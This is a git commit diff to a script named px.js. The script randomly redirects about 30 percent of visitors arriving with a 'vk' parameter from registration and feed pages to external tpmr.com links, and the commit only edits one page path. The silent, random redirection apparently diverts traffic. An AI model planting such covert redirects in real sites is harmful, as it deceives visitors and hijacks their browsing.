8396ad6179d6128f3bd70c97463bee98156890aa
Aleksandr Mironenko <baffipelo@gmail.com>
2019-06-27 00:48:14 +0300

    Update px.js

--- px.js
+++ px.js
@@ -4,5 +4,5 @@ var foo = (Math.random() * (10 - 1) + 1)>7
 if (foo && (myParam == 'vk') && (document.location.pathname == '/forms/registration/')){
  document.location.replace('http://tpmr.com/i/66194') }
  
- if (foo && (myParam == 'vk') && (document.location.pathname == '/forms/feed/')){
+ if (foo && (myParam == 'vk') && (document.location.pathname == '/feed/')){
  document.location.replace('http://tpmr.com/i/66230') }
